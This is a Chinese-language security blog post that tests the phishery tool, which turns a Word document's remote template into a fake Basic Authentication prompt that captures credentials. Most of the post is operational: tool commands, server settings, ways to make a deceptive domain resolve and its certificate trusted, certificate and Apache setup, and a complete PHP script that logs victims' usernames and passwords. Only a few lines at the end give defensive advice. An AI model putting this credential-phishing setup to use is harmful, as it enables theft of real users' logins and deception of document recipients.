---
layout: post
title: Phishing credentials via Basic Authentication(phishery)利用测试
---



## 0x00 前言
---

phishery是一个简单的支持SSL的HTTP服务器，其主要目的是通过基本身份验证钓鱼获得目标的凭据。

本文将要对其进行测试，介绍测试细节，分析实现原理，扩展用法。

phishery地址：

https://github.com/ryhanson/phishery

## 0x01 简介
---

本文将要介绍以下内容：

- phishery实际测试
- 实现原理
- 补充1： 使用openssh制作证书
- 补充2： php实现Basic Authentication
- 防御建议

## 0x02 phishery实际测试
---

测试系统： Win7x64

下载编译好的程序： 

https://github.com/ryhanson/phishery/releases/download/v1.0.2/phishery1.0.2windows-amd64.tar.gz

### 1、生成word文档

```
phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
```

参数说明：

- `https://secure.site.local/docs`作为伪造的web服务器地址，docs为文件名称(该文件必须存在，默认对应文件template.dotx)，目标用户在打开bad.docx时，会显示该域名
- good.docx为输入的word文档，文档为正常内容
- bad.docx为输出的word文档，在good.docx中插入Word document template

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/2-1.png)

### 2、启动HTTPS Auth Server

```
phishery
```

默认加载的配置文件为同级目录下的`settings.json`

内容如下:

```
{
  "ip": "0.0.0.0",
  "port": "443",
  "sslCert": "server.crt",
  "sslKey": "server.key",
  "basicRealm": "Secure Document Gateway",
  "responseStatus": 200,
  "responseFile": "template.dotx",
  "responseHeaders": [
    ["Content-Type", "application/vnd.openxmlformats-officedocument.wordprocessingml.template"]
  ]
}
```

**注：**

server.crt和server.key为工程中包含的测试证书文件，后面会介绍证书文件的生成方法

默认将获取的目标用户凭据保存在文件`credentials.json`

程序运行如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/2-2.png)

### 3、欺骗目标用户点击bad.docx

目标用户需要满足以下条件：

#### (1)能够解析域名

可选择以下三种方法：

方法1： 通过域名提供商，将域名解析到HTTPS Auth Server的IP地址

域名需要具有欺骗性

方法2： 修改网关的配置，将域名解析到HTTPS Auth Server的IP地址

需要获得网关配置的修改权限

方法3： 修改目标用户测试环境的hosts文件，将域名解析到HTTPS Auth Server的IP地址

仅作测试

**注：**

直接使用IP也可以，但是不具有欺骗性

#### (2)信任HTTPS Auth Server的证书文件

可选择以下三种方法：

方法1： HTTPS Auth Server的证书文件由权威CA机构颁发，目标信任该CA机构

将csr文件发送给CA机构进行校验，若审核通过，CA机构使用自己的私钥对csr文件进行签名，生成证书文件(.crt文件)

方法2： 使用可信的证书

方法3： 目标用户添加对证书的信任

将自签名证书安装到受信任的根证书颁发机构

如果目标用户不信任HTTPS Auth Server的证书文件，在打开文档时会弹出提示，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/3-1.png)

只有用户选择Yes，才会弹出输入凭据的对话框，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/3-2.png)

对话框中的域名同伪造的web服务器地址相同

目标用户输入凭据后，HTTPS Auth Server获得用户输入的凭据，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/3-3.png)

接下来，显示word文档的正常内容

## 0x03 实现原理
---

### 1、Basic Authentication

客户端在访问服务器时，如果服务器返回401 Unauthozied，并且Response的header为`WWW-Authenticate: Basic realm="xxxx"`

客户端将自动弹出一个登录窗口，要求用户输入用户名和口令

例如，通过IE访问https://secure.site.local/docs，弹出对话框，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/4-1.png)

客户端输入用户名和口令后，将用户名及口令以base64加密方式加密并发送

### 2、Word文档的Word document template

Word文档的Word document template可插入URL，在打开Word文档时，自动访问该URL

**注：**

必须为https，不支持http

查看方法：

`开发工具`->`加载项`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/4-2.png)

**注：**

Excel和PowerPoint无法使用这个方法

### 3、服务器接收消息，base64解密获得用户名和口令

对应程序源代码：

https://github.com/ryhanson/phishery/blob/master/phish/phishery.go#L50


##0x04 补充1： 使用openssh制作证书
---

### 1、安装openssh

Ubuntu：

```
sudo apt-get install openssl
```

Windows：

下载Apache，地址如下：

http://httpd.apache.org/download.cgi

安装Apache后默认安装openssl，位于\Apache24\bin

### 2、生成私钥文件test.com.key和证书签名请求test.com.csr

参数如下：

```
openssl x509 -req -days 3650 -in test.com.csr -signkey test.com.key -out test.com.crt
```

如果证书缺少主题备用名称SAN (Subject Alternate Name)，需要通过配置文件进行添加

参考资料：

https://support.citrix.com/article/CTX135602_

新建文件req.cnf，内容如下：

```
[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no
[req_distinguished_name]
C = US
ST = VA
L = SomeCity
O = MyCompany
OU = MyDivision
CN = test.com
[v3_req]
keyUsage = critical, digitalSignature, keyAgreement
extendedKeyUsage = serverAuth
subjectAltName = @alt_names
[alt_names]
DNS.1 = test.com
```

**注：**

CN和DNS.1都需要设定为域名(测试域名为test.com)

生成私钥和自签名证书：

```
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout test.com.key -out test.com.crt -config req.cnf -sha256
```

更多参数的细节可参考之前的文章[《CIA Hive Beacon Infrastructure复现2——使用Apache mod_rewrite实现https流量分发》](https://3gstudent.github.io/3gstudent.github.io/CIA-Hive-Beacon-Infrastructure%E5%A4%8D%E7%8E%B02-%E4%BD%BF%E7%94%A8Apache-mod_rewrite%E5%AE%9E%E7%8E%B0https%E6%B5%81%E9%87%8F%E5%88%86%E5%8F%91/)

## 0x05 补充2： php实现Basic Authentication
---

php环境使用phpstudy搭建

### 1、phpstudy开启ssl

#### (1)修改apache目录下的httpd.conf配置文件

定位`#LoadModule ssl_module modules/mod_ssl.so`，去掉注释符`#`

`# Secure (SSL/TLS) connections`下添加一行`Include conf/vhosts_ssl.conf`

#### (2)在conf文件夹下创建文件vhosts_ssl.conf

内容如下：

```
Listen 443
SSLStrictSNIVHostCheck off
SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL
SSLProtocol all -SSLv2 -SSLv3
<VirtualHost *:443>
    DocumentRoot "C:\WWW"
    ServerName test.com
  <Directory "C:\WWW">
      Options FollowSymLinks ExecCGI
      AllowOverride All
      Order allow,deny
      Allow from all
      Require all granted
  </Directory>
SSLEngine on
SSLCertificateFile "C:\Apache\conf\ssl\test.com.crt"
SSLCertificateKeyFile "C:\Apache\conf\ssl\test.com.key"
</VirtualHost>
```

#### (3)重启phpstudy

访问`https://127.0.0.1`，验证

### 2、php实现Basic Authentication，记录用户口令

php代码如下：

```
<?php
if(!isset($_SERVER['PHP_AUTH_USER']) or !isset($_SERVER['PHP_AUTH_PW']))
{
	file_put_contents("log.txt","ClientIP:".$_SERVER['REMOTE_ADDR']."\r\n",FILE_APPEND);
	header('WWW-Authenticate: Basic realm="Document Security"');
	header('HTTP/1.0 401 Unauthorized');
} 
else 
{
	file_put_contents("log.txt","ClientIP:".$_SERVER['REMOTE_ADDR'].",".$_SERVER['PHP_AUTH_USER'].":".$_SERVER['PHP_AUTH_PW']."\r\n",FILE_APPEND);
    print "File Not Found";	
}
```

代码实现了记录用户口令并写入文件log.txt，返回用户的内容为`File Not Found`

**注：**

该php脚本可以作为phishery的HTTPS Auth Server

通过php实现Basic Authentication，如果不使用https，弹出的对话框会多一些提示，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-20/4-3.png)

如果不使用https，无法作为Word document template插入Word文档

## 0x06 防御建议
---

检测到的实际攻击活动：

https://researchcenter.paloaltonetworks.com/2018/08/unit42-darkhydrus-uses-phishery-harvest-credentials-middle-east/

结合本文的分析和实际攻击活动的细节，给出如下建议：

- 正常word文档很少会要求用户输入凭据
- 对域名的证书进行检查(针对https)
- 对域名进行识别，是否是伪造的域名

## 0x07 小结
---

本文对phishery进行测试，介绍测试细节，分析实现原理，补充了php实现Basic Authentication的方法，最后给出防御建议

个人认为phishery的另一个作用：将内网的一台Windows主机作为服务器，用于记录目标输入的凭据


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



